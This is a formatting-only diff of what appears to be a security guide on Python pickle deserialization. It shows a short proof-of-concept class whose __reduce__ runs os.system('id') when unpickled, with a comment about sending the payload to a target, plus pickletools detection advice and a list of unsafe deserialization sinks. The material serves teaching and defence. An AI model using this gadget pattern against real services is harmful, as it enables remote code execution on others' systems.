@@ -233,9 +233,11 @@ Python's `pickle.loads()` calls `__reduce__()` on objects during deserialization
 import pickle
 import os
 
+
 class Exploit:
     def __reduce__(self):
         return (os.system, ("id",))
+
 
 payload = pickle.dumps(Exploit())
 # Send payload to target that calls pickle.loads()
@@ -245,6 +247,7 @@ payload = pickle.dumps(Exploit())
 
 ```python
 import pickletools
+
 pickletools.dis(payload)
 # Shows opcodes: GLOBAL, REDUCE, etc.
 # Look for GLOBAL referencing dangerous modules (os, subprocess, builtins)
@@ -255,7 +258,7 @@ pickletools.dis(payload)
 ```python
 pickle.loads(user_data)
 pickle.load(file_handle)
-yaml.load(data)           # PyYAML without Loader=SafeLoader
+yaml.load(data)  # PyYAML without Loader=SafeLoader
 jsonpickle.decode(data)
 shelve.open(path)
 ```
